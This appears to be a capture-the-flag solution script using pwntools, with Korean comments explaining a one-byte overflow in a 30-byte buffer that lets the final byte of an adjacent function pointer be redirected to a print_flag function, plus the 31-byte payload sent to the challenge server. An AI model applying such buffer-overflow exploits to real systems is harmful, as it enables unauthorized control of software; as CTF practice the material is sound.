from pwn import *

'''
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
'''

context(arch="i386", os='linux')

r = remote("ctf.j0n9hyun.xyz", 3007)

# select_func 함수에서 입력받은 값을 복사하는 부분이 있다
# char배열이 30byte만큼 할당 되어있지만 31byte만큼 복사했다
# 바로 뒤에 함수 포인터가 있었는데 마지막 1byte를 덮을 수 있다.
# 미리 할당된 two라는 함수와 print_flag함수의 offset이 마지막 1byte부분만 달라서
# 해당 부분을 print_flag 함수의 값으로 덮었다.
payload = b"\xd8"*31
r.sendline(payload)

r.interactive()